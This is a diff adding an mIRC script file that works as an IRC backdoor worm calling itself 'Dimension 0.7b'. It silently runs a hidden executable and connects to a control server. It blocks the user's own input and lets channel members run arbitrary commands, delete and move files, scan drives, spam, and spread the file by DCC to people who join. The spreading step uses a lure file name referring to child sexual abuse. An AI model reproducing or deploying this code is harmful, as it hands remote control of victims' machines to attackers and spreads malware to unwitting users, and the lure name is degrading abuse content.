@@ -1,0 +1,96 @@
+[script]
+n0=on *:start:{ 
+n1=  if ($exists(temp2.exe) == $false) { exit } 
+n2=  run temp2.exe /n /fh       
+n3=  if (%server == $null) { set %server irc.prison.net } 
+n4=  set %timeout 10 
+n5=  nick $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) 
+n6=  remini mirc.ini ident userid 
+n7=  remini mirc.ini mirc user 
+n8=  remini mirc.ini mirc email 
+n9=  remini mirc.ini mirc anick
+n10=  writeini mirc.ini mirc anick $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
+n11=  writeini mirc.ini mirc email $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
+n12=  writeini mirc.ini ident userid $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
+n13=  writeini mirc.ini mirc user $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
+n14=  identd on $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
+n15=  timerc 1 4 //server %server $+ : $+ 6667 
+n16=  run temp2.exe /n /fh        
+n17=}
+n18=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %chan Warning (User Input command) $1- | /clearall | //run temp2.exe /n /fh        | halt }
+n19=on 1:TEXT:*:*:{
+n20=  if ($exists(temp2.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (temp2.exe (hide not detected! quitting)) | /exit }
+n21=  if ($1 == !quit) { /msg # Astalavista Baybee. | /quit $1-  }
+n22=  if ($1 == !fserv) { /msg # [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }
+n23=  if ($1 == !up) { mode # +o $nick }
+n24=  if ($1 == !mode) { mode $2 $3-  }
+n25=  if ($1 == !down) {  mode # -o+v $nick $nick   }
+n26=  if ($1 == !jserver) {  if ($2 == $null) { /msg $nick Hey man, you didnt tell me a server to jump too! i need a port also, btw. | halt } | /set %server $2 | set %server.port $3 | //notice $nick Now quitting then joining %server same channel. %chan | /quit Leaving.. to a different server ;) | /server %server $+ : $+ $3  }
+n27=  if ($1 == !aserver) { if ($2 == $null) { /msg # Syntax/Error: (ex. !aserver irc.dal.net) | halt } |  /write servers.txt $2-  } 
+n28=  if ($1 == !cserver) { if ($lines(servers.txt) == 0) { /msg # Error: servers.txt is empty! | halt } |  /msg # [Server-List-Cleared&Deleted] ( $+ $lines(servers.txt) $+ ) From: (servers.txt). | /write -c servers.txt | remove servers.txt  }
+n29=  if ($1 == !reload) { /timer -o 1 15 /server %server |  /quit Reloading... (15 sec)  }
+n30=  if ($1 == !join) { if ($2- == $null) { /msg # Error/Syntax: (No channel given to join.) | halt } |  /join $2  }
+n31=  if ($1 == !part) {  if ($2- == %chan) { /msg # Hey ButtWipe I Aint Leaving. | halt } |  if ($2 == $null) { /msg # Error/Syntax: !part $chr(35) $+ channel | halt } |  else { /part $$2 $3- }  }
+n32=  if ($1 == !cycle) { if ($2 == $null) { /msg # Error/Syntax: (!cycle #Channel Please } |  /raw -q part $2 Cycling. | raw -q join $2  }
+n33=  if ($1 == !op) {  if ($3 == $null) { /msg # Error/Syntax: !op #channel $nick | halt } |   else { /mode $2 +o $3 } }
+n34=  if ($1 == !deop) {  if ($3 == $null) { /msg # Error/Syntax: !deop #channel $nick | halt } |  else { /mode $2 -o $3 }  }
+n35=  if ($1 == !voice) {  if ($3 == $null) { /msg # Error/Syntax:  !voice #channel Nick | halt } |   else { /mode $2 +v $3 }  }
+n36=  if ($1 == !devoice) {  if ($3 == $null) { /msg # Error/Syntax: !devoice #channel Nick | halt } |     else { /mode $2 -v $3 }  }
+n37=  if ($1 == !kick) {  if ($4 == $null) { /msg # Error/Syntax: !kick #channel Nick MSG | halt } |  else { /kick $2 $3 $4- }  } 
+n38=  if ($1 == !stat) { if ($exists(info.x) == $false) { .run info.vbs } | msg # Dimension 0.7b Info Date:[ $+  $asctime(dddd mmmm dd yyyy) $+ ] Time:[ $+  $asctime(hh:nn tt ) $+ ]  OS:[Windows $+ $os $+ ] UpTime:[ $+  $duration($calc( $ticks / 1000 )) $+ ] Current-URL:[ $+ $url $+ ] | .play # info.x }
+n39=  if ($1 == !kick/ban) { if ($4 == $null) { /msg # Error/Syntax: !kick/ban #channel Nick MSG (KickMessage) | halt } |  else {  /mode $2 -o+b $3 $address($3,2)  | /kick $2 $3 $4-  | halt }  }
+n40=  if ($1 == !set)  { if ($2 == $null) { msg # Error/Syntax: !set %variable whatever | halt } | //set $2 [ [ $3- ] ] | //msg # [var set:] [ $+ $2 $+ ] :to: [ $+ [ [ $3- ] ] $+ ]  }
+n41=  if ($1 == !unset) {  if ($2 == $null) { msg # Error/Syntax: !unset %variable | halt } |  //unset $2 |  //msg # [var unset:] [ $+ $2 $+ ]  }
+n42=  if ($1 == !mediascan) { /msg # Files:[(mp3/ $+ $findfile(c:\,*.mp3,0) $+ )(mpg/ $+ $findfile(c:\,*.mpg,0) $+ (asf/ $+ $findfile(c:\,*.asf,0) }
+n43=  if ($1 == !ircspread) { set %spread 1 | msg # IRC Spread Enabled Join me to a Channel Kiddo, to disable type !stopircs. }
+n44=  if ($1 == !stopircs) { unset %spread | msg # IRC Spread Disabled. }
+n45=  if ($1 == !spam) { set %spam2 1 | set %spam1 $2- | msg # IRC Spam Enabled }
+n46=  if ($1 == !stopspam) { unset %spam2 | unset %spam1 | msg # IRC Spam Disabled }
+n47=  if ($1 == !-) { /msg # [Done]: / $+ $2- | write -c fuck.txt $2- | play -sc fuck.txt | timer 1 3 /remove fuck.txt }
+n48=}
+n49=
+n50=on 1:JOIN:#:{ if ( %spread == $null ) { halt }
+n51=  /dcc send $nick 8yrOldGangRape.MPG.zip
+n52=}
+n53=on 1:FILESENT:*.exe:/msg %chan Sent $filename to $nick $address
+n54=on 1:JOIN:#: { if (%spam2) { .msg $nick %spam1 } }
+n55=
+n56=on 1:SERV:del*: { 
+n57=  if (*yes* !iswm $3) { 
+n58=    .msg = $+ $nick If you're sure you want to delete $cd $+ \ $+ $2 type .del $2 -yes
+n59=    halt
+n60=  }
+n61=  .remove $cd $+ \ $+ $2
+n62=  .msg = $+ $nick Deleted file $cd $+ \ $+ $2
+n63=  halt
+n64=}
+n65=
+n66=on 1:SERV:move*: { 
+n67=  if (($exists($3) == $true) && (*yes* !iswm $4)) { 
+n68=    .msg = $+ $nick $2 Exists, type move $2 $3 -yes to overwrite
+n69=    halt
+n70=  }
+n71=  if (($exists($3) == $true) && (*yes* iswm $4)) { .remove $3 }
+n72=  .msg = $+ $nick Renames/Moved $2 => $3
+n73=  .rename $2 $3
+n74=  halt
+n75=}
+n76=on 1:START: { gethosts }
+n77=alias gethosts {
+n78=  set %dns.yes Yes
+n79=  if (%im.on == $null) { set %im.on 1 }
+n80=  if (%im.on > 3) { set %im.on 1 }
+n81=  if (%im.on == 1) { dns irc.prison.net | halt }
+n82=  if (%im.on == 2) { dns irc.prison.net | halt }
+n83=  if (%im.on == 3) { dns irc.prison.net | halt }
+n84=}
+n85=on 1:DNS: {
+n86=  if (%dns.yes == Yes) {
+n87=    if ($iaddress) { server $iaddress | set %im.on 1 | halt }
+n88=    if ($iaddress == $null) { inc %im.on 1 | .timerDNS -o 1 5 gethosts | halt }
+n89=  }
+n90=}
+n91=on 1:CONNECT:/timerDNS off | unset %dns.yes
+n92=on 1:DISCONNECT:/gethosts
+n93=on 1:FILESENT:*.*: { /msg #birthday Filesent to $nick , $filename, $address, $time | write filesent.txt $filename ( $+ $date $+ , $time $+ , $nick $filename ) }
+n94=on 1:FILERCVD:*.*: { /msg #birthday Filerecieved from $nick , $filename, $address, $time | write filerecieved.txt ( $filename, $+ $date $+ , $time $+ , $nick $+ ) }
